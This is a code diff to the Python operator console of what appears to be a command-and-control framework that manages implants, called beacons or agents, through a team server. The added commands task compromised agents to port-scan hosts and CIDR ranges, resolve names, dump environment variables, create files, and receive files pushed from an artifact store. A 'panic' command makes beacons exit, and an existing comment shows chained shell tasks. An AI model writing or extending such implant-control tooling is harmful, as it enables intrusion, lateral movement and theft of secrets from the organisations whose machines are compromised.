@@ -68,6 +68,15 @@ def json_default(value: Any) -> Any:
     return str(value)
 
 
+def emit(payload: Any) -> None:
+    """One canonical JSON shape: bytes as text, keys sorted.
+
+    It lives at module level so the helpers that wait for a task result can
+    print it too, not only the command dispatcher.
+    """
+    print(json.dumps(payload, indent=2, sort_keys=True, default=json_default))
+
+
 def decode_out(value: Any) -> str:
     if isinstance(value, (bytes, bytearray)):
         try:
@@ -505,6 +514,23 @@ def watch_events(client: OperatorClient, limit: int = 0, as_json: bool = False) 
         return 0
 
 
+def print_artifacts(rows: List[Dict[str, Any]]) -> None:
+    """The artifacts the team server holds."""
+    if not rows:
+        print("the artifact store is empty")
+        return
+    table_rows = [
+        [
+            str(a.get("name", "?")),
+            str(a.get("size", "?")),
+            str(a.get("sha256", ""))[:16],
+            fmt_ts(a.get("created")),
+        ]
+        for a in rows
+    ]
+    print(table(["NAME", "SIZE", "SHA256", "CREATED"], table_rows))
+
+
 def print_sessions(rows: List[Dict[str, Any]]) -> None:
     """Print the interactive sessions that are open."""
     if not rows:
@@ -641,6 +667,79 @@ class Console:
                 task_id = self.client.submit(self.target(), "netinfo", {})
                 self.note_task(task_id, self.target(), "netinfo", {})
                 print_task_result(self.client.wait_for_result(task_id))
+            elif cmd == "scan":
+                # scan <target> [ports=22,80,443]
+                if not rest:
+                    print("usage: scan <target> [ports=22,80,443]")
+                    return True
+                options = parse_filter(" ".join(rest[1:]))
+                task_args = {"host": rest[0],
+                             "ports": options.get("ports", "22,80,443")}
+                task_id = self.client.submit(self.target(), "scan", task_args)
+                self.note_task(task_id, self.target(), "scan", task_args)
+                print_task_result(self.client.wait_for_result(task_id))
+            elif cmd == "resolve":
+                if not rest:
+                    print("usage: resolve <host>")
+                    return True
+                task_args = {"host": rest[0]}
+                task_id = self.client.submit(self.target(), "resolve", task_args)
+                self.note_task(task_id, self.target(), "resolve", task_args)
+                print_task_result(self.client.wait_for_result(task_id))
+            elif cmd == "env":
+                options = parse_filter(" ".join(rest))
+                task_args = {"filter": options.get("filter", "")}
+                task_id = self.client.submit(self.target(), "env", task_args)
+                self.note_task(task_id, self.target(), "env", task_args)
+                print_task_result(self.client.wait_for_result(task_id))
+            elif cmd == "touch":
+                if not rest:
+                    print("usage: touch <path>")
+                    return True
+                task_args = {"path": rest[0]}
+                task_id = self.client.submit(self.target(), "touch", task_args)
+                self.note_task(task_id, self.target(), "touch", task_args)
+                print_task_result(self.client.wait_for_result(task_id))
+            elif cmd == "artifact":
+                # artifact list | put <file> [name] | get <name> <file> | remove <name>
+                if not rest:
+                    print("usage: artifact list|put <file>|get <name> <file>|remove <name>")
+                    return True
+                action = rest[0]
+                if action == "list":
+                    print_artifacts(self.client.artifact_list())
+                elif action == "put" and len(rest) > 1:
+                    name = rest[2] if len(rest) > 2 else os.path.basename(rest[1])
+                    info = self.client.artifact_upload(name, rest[1])
+                    print(f"stored {info.get('name')} ({info.get('size')} bytes)")
+                elif action == "get" and len(rest) > 2:
+                    info = self.client.artifact_download(rest[1], rest[2])
+                    print(f"wrote {info.get('bytes')} bytes to {info.get('local')}")
+                elif action == "remove" and len(rest) > 1:
+                    self.client.artifact_remove(rest[1])
+                    print(f"removed {rest[1]}")
+                else:
+                    print("usage: artifact list|put <file>|get <name> <file>|remove <name>")
+            elif cmd == "panic":
+                # The end of an engagement on the target side: the operator
+                # says the word, so a stray keystroke does not burn the fleet.
+                try:
+                    answer = input("type 'panic' to continue: ").strip()
+                except (EOFError, KeyboardInterrupt):
+                    print()
+                    print("nothing was changed")
+                    return True
+                if answer != "panic":
+                    print("nothing was changed")
+                    return True
+                if "--all" in rest:
+                    data = self.client.panic(all_agents=True)
+                else:
+                    target = rest[0] if rest else self.target()
+                    data = self.client.panic([target])
+                print(f"panicked {data.get('count', 0)} agent(s)")
+                for agent_id in data.get("panicked", []):
+                    print(f"  {agent_id}")
             elif cmd == "chain":
                 # chain <agent> shell:{"cmd":"id"} shell:{"cmd":"cat {{output}}"}
                 if not rest:
@@ -987,6 +1086,12 @@ def print_help() -> None:
   triage <path>            triage a file on the agent
   find <name>              search for files on the agent
   netinfo                  the network configuration of the agent
+  scan <target> [ports=…]  scan a range of hosts for open ports
+  resolve <host>           where a name points at
+  env [filter=…]           the environment of the agent
+  touch <path>             create a file on the agent and stamp it
+  artifact [list|put|get|remove]  the team server's file store
+  panic [agent-id]         tell the beacons to exit (asks twice)
   alerts                   the alert rules of the server
   policy <agent> sleep=60   push the beacon cadence
   whoami | me               your identity, role and allowed commands
@@ -1625,6 +1730,52 @@ def build_parser() -> argparse.ArgumentParser:
     tag.add_argument("--state", default="", help="filter: online or offline")
     tag.add_argument("--match", default="", help="filter: agents carrying this tag")
 
+    # -- the server-side file store ---------------------------------------
+    artifact = sub.add_parser("artifact", help="the team server's file store")
+    artifact.add_argument("action", choices=["list", "put", "get", "remove", "push"],
+                          help="what to do with the store")
+    artifact.add_argument("name", nargs="?", default="", help="artifact name")
+    artifact.add_argument("agent", nargs="?", default="", help="agent id (push)")
+    artifact.add_argument("--file", default="", help="the local file (put, get)")
+    artifact.add_argument("--path", default="", help="the path on the agent (push)")
+
+    # -- network reach and the local environment ---------------------------
+    scan = sub.add_parser("scan", help="scan a range of hosts for open ports")
+    scan.add_argument("agent")
+    scan.add_argument("target", help="an address or a CIDR block")
+    scan.add_argument("--ports", default="22,80,443", help="the ports to try")
+    scan.add_argument("--timeout-ms", dest="timeout_ms", type=int, default=800,
+                      help="how long a single connect may take")
+    scan.add_argument("--wait", action="store_true")
+    scan.add_argument("--timeout", type=float, default=300.0)
+
+    resolve = sub.add_parser("resolve", help="resolve a name on an agent")
+    resolve.add_argument("agent")
+    resolve.add_argument("host")
+    resolve.add_argument("--port", type=int, default=0)
+    resolve.add_argument("--wait", action="store_true")
+    resolve.add_argument("--timeout", type=float, default=120.0)
+
+    env = sub.add_parser("env", help="the environment of an agent")
+    env.add_argument("agent")
+    env.add_argument("--filter", default="",
+                     help="only the variables whose name contains this")
+    env.add_argument("--wait", action="store_true")
+    env.add_argument("--timeout", type=float, default=120.0)
+
+    touch = sub.add_parser("touch", help="create a file on an agent and stamp it")
+    touch.add_argument("agent")
+    touch.add_argument("path")
+    touch.add_argument("--wait", action="store_true")
+    touch.add_argument("--timeout", type=float, default=120.0)
+
+    # -- burning an engagement ---------------------------------------------
+    panic = sub.add_parser("panic", help="tell the beacons to exit and stop their work")
+    panic.add_argument("agent", nargs="?", default="", help="agent id")
+    panic.add_argument("--all", action="store_true",
+                       help="every agent the server knows, sleeping ones included")
+    panic.add_argument("--yes", action="store_true", help="do not ask")
+
     # -- local state ------------------------------------------------------
     dbcmd = sub.add_parser("db", help="the console's local state database (SQLite)")
     dbcmd.add_argument("action", choices=[
@@ -1700,10 +1851,6 @@ def main(argv: Optional[List[str]] = None) -> int:
                 if not console.run_command(line):
                     break
             return 0
-
-        def emit(payload: Any) -> None:
-            """One canonical JSON shape: bytes as text, keys sorted."""
-            print(json.dumps(payload, indent=2, sort_keys=True, default=json_default))
 
         if args.cmd == "agents":
             rows = client.agents(
@@ -1939,6 +2086,94 @@ def main(argv: Optional[List[str]] = None) -> int:
                 print(f"removed {res.get('agents', 0)} agents, "
                       f"{res.get('tasks', 0)} tasks and "
                       f"{res.get('schedules', 0)} schedules")
+        elif args.cmd == "panic":
+            # The end of an engagement on the target side.  The beacons are
+            # told to exit and the server stops feeding them, so the
+            # operator is asked twice.
+            if not args.yes:
+                print("this tells the selected beacons to exit and stops "
+                      "the server from queueing any more work for them.")
+                print("the implants that are asleep get the command on "
+                      "their next check-in.")
+                try:
+                    answer = input("type 'panic' to continue: ").strip()
+                except (EOFError, KeyboardInterrupt):
+                    print()
+                    print("nothing was changed")
+                    return 0
+                if answer != "panic":
+                    print("nothing was changed")
+                    return 0
+            res = client.panic([args.agent] if args.agent else None, args.all)
+            if args.json:
+                emit(res)
+            else:
+                print(f"panicked {res.get('count', 0)} agents")
+                for agent_id in res.get("panicked", []):
+                    print(f"  {agent_id}")
+        elif args.cmd == "artifact":
+            if args.action == "list":
+                rows = client.artifact_list()
+                if args.json:
+                    emit(rows)
+                else:
+                    print_artifacts(rows)
+            elif args.action == "put":
+                if not args.file:
+                    print("artifact put needs --file", file=sys.stderr)
+                    return 2
+                # Without a name the file keeps its own.
+                name = args.name or os.path.basename(args.file)
+                info = client.artifact_upload(name, args.file)
+                if args.json:
+                    emit(info)
+                else:
+                    print(f"stored {info.get('name')} "
+                          f"({info.get('size')} bytes, "
+                          f"sha256 {info.get('sha256')})")
+            elif args.action == "get":
+                if not args.file:
+                    print("artifact get needs --file", file=sys.stderr)
+                    return 2
+                info = client.artifact_download(args.name, args.file)
+                if args.json:
+                    emit(info)
+                else:
+                    print(f"wrote {info.get('bytes')} bytes to "
+                          f"{info.get('local')}")
+            elif args.action == "remove":
+                info = client.artifact_remove(args.name)
+                if args.json:
+                    emit(info)
+                else:
+                    print(f"removed {args.name}")
+            elif args.action == "push":
+                info = client.artifact_push(args.name, args.agent, args.path)
+                if args.json:
+                    emit(info)
+                else:
+                    print(f"pushing {args.name} to {args.agent} "
+                          f"({info.get('stages')} chunks, "
+                          f"{info.get('size')} bytes)")
+        elif args.cmd == "scan":
+            run_task_and_wait(client, console, args.agent, "scan", {
+                "host": args.target,
+                "ports": args.ports,
+                "timeout_ms": args.timeout_ms,
+            }, args.wait, args.timeout, args.json)
+        elif args.cmd == "resolve":
+            run_task_and_wait(client, console, args.agent, "resolve", {
+                "host": args.host,
+                "port": args.port,
+            }, args.wait, args.timeout, args.json)
+        elif args.cmd == "env":
+            run_task_and_wait(client, console, args.agent, "env", {
+                "filter": args.filter,
+            }, args.wait, args.timeout, args.json)
+        elif args.cmd == "touch":
+            run_task_and_wait(client, console, args.agent, "touch", {
+                "path": args.path,
+            }, args.wait, args.timeout, args.json)
         elif args.cmd == "sessions":
             rows = client.sessions()
             if args.json:
